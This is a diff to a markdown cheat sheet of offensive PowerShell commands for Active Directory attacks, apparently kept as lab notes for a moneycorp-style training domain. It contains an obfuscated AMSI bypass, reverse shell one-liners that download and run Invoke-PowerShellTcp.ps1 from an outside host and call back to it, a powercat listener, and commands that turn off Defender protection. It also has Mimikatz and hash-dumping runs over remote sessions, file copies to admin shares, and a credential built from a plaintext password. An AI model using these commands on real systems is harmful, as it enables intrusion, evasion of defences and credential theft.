@@ -19,11 +19,13 @@ AMSI bypass
 ```powershell
 S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
+
 Rev shell
 ```powershell
 powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
 powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
 ```
+
 Listener
 ```powershell
 powercat -l -v -p 443 -t 100
@@ -40,6 +42,7 @@ Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Conten
 Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
 Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content <list_of_servers>) -ArgumentList
 ```
+
 Example of run remote command
 ```powershell
 $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
@@ -47,6 +50,17 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
 Invoke-command -ScriptBlock {Invoke-Mimikatz} -Session $sess
 Enter-PSSession $sess
+```
+
+Check language mode and app locker config
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+Copy files
+```powershell
+Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
 ## Enumeration
@@ -57,6 +71,8 @@ Get all the users
 ```powershell
 Get-NetUser
 Get-NetUser | select -ExpandProperty samaccountname
+$SecPassword = ConvertTo-SecureString 'Welcome2015' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('PWNY\jar-jar.binks', $SecPassword)
 Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
 Get-NetUser -Username student1
 Get-UserProperty -Properties pwdlastset
